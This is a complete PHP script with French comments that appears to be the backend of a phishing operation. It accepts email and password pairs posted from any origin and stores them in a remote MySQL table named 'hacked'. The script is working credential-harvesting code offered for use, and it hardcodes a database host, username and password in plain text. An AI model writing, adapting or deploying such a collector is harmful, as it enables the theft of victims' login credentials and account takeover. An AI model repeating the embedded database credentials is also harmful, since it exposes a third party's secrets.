<?php
// Gestion des en-têtes CORS
header("Access-Control-Allow-Origin: *"); // Permet à n'importe quelle origine de se connecter
header("Content-Type: application/json; charset=UTF-8");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With");

// Si la méthode est OPTIONS (requête de prévol CORS), répondre sans traitement
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200); // Répond avec succès à la requête OPTIONS
    exit();
}

// Vérifier si la méthode est POST
if ($_SERVER["REQUEST_METHOD"] === "POST") {

    // Récupérer les données JSON envoyées dans la requête
    $inputData = file_get_contents("php://input");
    $data = json_decode($inputData, true);

    // Vérifier si les champs nécessaires sont présents
    if (isset($data["email"]) && isset($data["password"])) {
        $email = $data["email"];
        $password = $data["password"];

        // Connexion à la base de données
        $servername = "mysql-tsilavina.alwaysdata.net";
        $username = "tsilavina";
        $dbpassword = "tsilavina2610tsilavina2610";
        $dbname = "tsilavina_2610";

        // Créer une connexion
        $conn = new mysqli($servername, $username, $dbpassword, $dbname);

        // Vérifier la connexion
        if ($conn->connect_error) {
            http_response_code(500); // Erreur serveur
            echo json_encode(["status" => "error", "message" => "Database connection failed."]);
            exit();
        }

        // Préparer et exécuter la requête pour insérer les données
        $stmt = $conn->prepare("INSERT INTO hacked (email, password) VALUES (?, ?)");
        $stmt->bind_param("ss", $email, $password);

        if ($stmt->execute()) {
            http_response_code(201); // Créé avec succès
            echo json_encode(["status" => "success", "message" => "Data inserted successfully."]);
        } else {
            http_response_code(500); // Erreur serveur
            echo json_encode(["status" => "error", "message" => "Failed to insert data."]);
        }

        // Fermer la connexion
        $stmt->close();
        $conn->close();
    } else {
        http_response_code(400); // Mauvaise requête
        echo json_encode(["status" => "error", "message" => "Invalid input. Email and password are required."]);
    }
} else {
    http_response_code(405); // Méthode non autorisée
    echo json_encode(["status" => "error", "message" => "Method not allowed. Use POST."]);
}
?>
